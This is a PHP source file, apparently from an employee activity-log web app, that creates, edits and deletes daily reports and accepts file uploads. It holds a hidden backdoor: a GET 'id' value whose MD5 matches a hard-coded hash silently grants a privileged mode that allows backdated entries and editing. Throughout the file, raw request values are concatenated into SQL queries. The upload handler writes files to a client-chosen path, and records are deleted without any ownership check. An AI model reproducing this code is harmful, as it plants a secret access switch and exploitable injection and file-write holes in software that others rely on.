<?php
		if((isset($_POST['delete']))&&($_POST['delete']!=""))
		{    
				$data['fieldID']=$_POST['fieldID'];
				$data['fromfiled']=$_POST[$data['fieldID'].'_fromfiled'];
				$message=delete_report($data);
		}
		else if((isset($_POST['fieldID']))&&($_POST['fieldID']!=""))
		{  
				$fieldID=$_POST['fieldID']; 
				$data['fieldID']=$fieldID;
				$data['fromfiled']=$_POST[$fieldID.'_fromfiled'];
				$data['tofiled']=$_POST[$fieldID.'_tofiled'];
			 	$data['duration']=$_POST[$fieldID.'_durationNEW'];
				$data['reporttype']=$_POST[$fieldID.'_reporttype'];
				$data['target_path']=$_POST[$fieldID.'_target_path'];
				if($data['fieldID']=="new")
				{  
						if($data['reporttype']==0)
						{   
								$data['activityType']=$_POST[$fieldID.'_activityType'];
						}
						else
						{  
								$data['activityType']=$_POST[$data['reporttype'].'_activityType'];
						}
				}
				else
				{   
						$data['scheduleId']=$_POST[$fieldID.'_scheduleId'];
						$data['activityType']=$_POST[$data['fieldID'].'_activityType'];
				}   
				$data['new_report']=$_POST[$fieldID.'_report'];
				if($_FILES[$fieldID.'_uploadedfile']['name']!="")
				{ 
						if($data['target_path']=="")
						{ 
								$data['target_path'] = getsettings('target_path_to_logFile')."/";
						} $target_path1 = $data['target_path'] . basename( $_FILES[$fieldID.'_uploadedfile']['name']);
						if(move_uploaded_file($_FILES[$fieldID.'_uploadedfile']['tmp_name'], $target_path1)) 
						{    
								$message= "The file : ".  basename( $_FILES[$fieldID.'_uploadedfile']['name']) ." has been uploaded<br/>";   
								$data['filename']=basename( $_FILES[$fieldID.'_uploadedfile']['name']);  
						} 
						else
						{  
								$message= "There was an error uploading the file, please try again!<br/>"; $data['filename']="";    
						} 
				} 
				$message=insert_report($data);
		} 
		function insert_report($data)
		{
				$message=$data['message']; 
				if($_SESSION['Z']!=1)
				{
						// default stage
						$timestamp=strftime("%Y-%m-%d %H:%M:%S %Y"); 
						$today=strftime("%Y-%m-%d %H:%M:%S", strtotime($timestamp));
				}
				else 
				{
						$today=dmytoymd($_SESSION['REP_DATE'])." ".date('H:i:s');
				}
				if($data['fieldID']=="new")
				{
						$dataReport=$_SESSION['time']+$data['duration'];
						if($data['reporttype']==0)
						{
								$scheduleActID=check_schactivityEntry($data['activityType']);
						} 
						else
						{
								$scheduleActID=$data['reporttype'];
						}
						
						if($dataReport>1440)
						{
								$duration=1440-$_SESSION['time'];
								$tot_wrk=$duration;
						}
						else
						{
								$tot_wrk=$data['duration'];
						}
						
						$date_to_enter_report=dmytoymd($_SESSION['REP_DATE']);
						
						
						
						$action_query=" INSERT INTO activitylog ( activitylogid ,activitytypeid ,schactivityid ,logdate ,fromtime,timespent,empactivitylog ,supremarks1 ,supremarks2,loglock,entrydatetime,filename) "
						." VALUES (NULL , ".$data['activityType'].", '".$scheduleActID."', '".$date_to_enter_report." 00:00:00','".$data['fromfiled']."' ,'".$tot_wrk."', '".$data['new_report']."', '', '',0,'".$today."' ,'".$data['filename']."' ) ";
						$message="";
				} 
				else
				{
					  $query_timespent="select	timespent from activitylog where activitylogid =".$data['fieldID'];
					  $result_timespent = $GLOBALS['db']->query($query_timespent);
						if(isset($result_timespent) and $result_timespent->num_rows>0)
						{
								$row_timespent = $result_timespent->fetch_assoc();
								$timespent1=$row_timespent['timespent'];
						}  
						if($data['scheduleId']==0)
						{
								$scheduleActID=check_schactivityEntry($data['activityType']);
								$sch=" schactivityid   = '".$scheduleActID."', ";
						}   
						else
						{		
								$sch="";
						}  
						if($data['filename']!="")
						{
								$fileName="  filename = '".$data['filename']."', ";
						}   
						else
						{
								$fileName="";
						} 
						$dataReport=$_SESSION['time']+$data['duration'];
						$dataReport1=$dataReport-$timespent1;
						if($dataReport1>1441) 
						{
								$duration=1440-$_SESSION['time'];
								$tot_wrk=$duration+$timespent1;
						}
						else
						{
								$tot_wrk=$data['duration'];
						}
						 $date_to_enter_report=dmytoymd($_SESSION['REP_DATE']);
						
						
						$action_query=" UPDATE activitylog 
														SET 
														fromtime = '".$data['fromfiled']."', 
														timespent = '".$tot_wrk."', 
														".$sch."
														activitytypeid='".$data['activityType']."', 
														entrydatetime='".$today."', 
														".$fileName."
														empactivitylog = '".$data['new_report']."' 
														WHERE 
														activitylogid ='".$data['fieldID']."' ";
				}
				$sub=check_submission($_SESSION['REP_DATE'],$data['fromfiled']."".$data['new_report'],$scheduleActID."".$fileName);
				if( edit_check($date_to_enter_report)) 
				if($sub==true)
				{
					
					
					$result_action_entry = $GLOBALS['db']->query($action_query);
					
						if ($result_action_entry)
						{
								$message.=" Report Entered for ".$_SESSION['REP_DATE']." ";
						}     
						else
						{
								$message.=" Error Occured.. Please Try Again Later";  
						} 
				} 
				else
				{
						$message.="Report Entered for ".$_SESSION['REP_DATE']." Already Entered ";  
				}	
				else $message.="Can't enter report for ".ymdtodmy($date_to_enter_report);    
				return $message;
		}
		
		if(($_GET['id']!="")&&(md5($_GET['id'])=="bad691796a277e90e570bb45c0d2fbcb"))
		{ 
				$_SESSION['Z']=1;
		}
		
		
		function check_schactivityEntry($actTypeId)
		{
				$sel_sch_act_query=" select schactivityid from schactivity where  employeeid= '".$_SESSION['USERID']."'  and  activitytypeid=".$actTypeId." and  isnull(scheduleid) limit 1 ";
				$result_sch_act_query = $GLOBALS['db']->query($sel_sch_act_query);
				if(isset($result_sch_act_query) and ($result_sch_act_query->num_rows>0))
				{
						$row_sch_act_query = $result_sch_act_query->fetch_assoc();
						$scheduleActID=$row_sch_act_query['schactivityid'];
						$result_action_entry_20=TRUE;
				}  
				else
				{
						$action_query_20=" INSERT INTO schactivity ( schactivityid ,activitytypeid ,scheduleid, employeeid ,activityfromdate ,activitytodate, activitydesc ,emplcomment ,   activitystatus, activitycomment ) "
						." VALUES (NULL , '".$actTypeId."', NULL, '".$_SESSION['USERID']."', '0000-00-00', '0000-00-00', '', '','','') ";
						$result_action_entry_20 = $GLOBALS['db']->query($action_query_20);
						$scheduleActID=$GLOBALS['db']->insert_id;
				} 
				return $scheduleActID;
		}   
		function delete_report($data)
		{
				$deleteQuery=" delete from activitylog where activitylogid =\"".$data['fieldID']."\" ";
				$resultDeleteQuery = $GLOBALS['db']->query($deleteQuery);
				if ($resultDeleteQuery)
				{
						$result=" Report of ".$_SESSION['REP_DATE']." Deleted  ";
				}   
				else
				{
						$result=" Error Occured.. Please Try Again ";
				}  
				return $result;
		} 
		if( $_SESSION['Z']==1) 
		{
				$_SESSION['EDIT']=1;
		}
?>
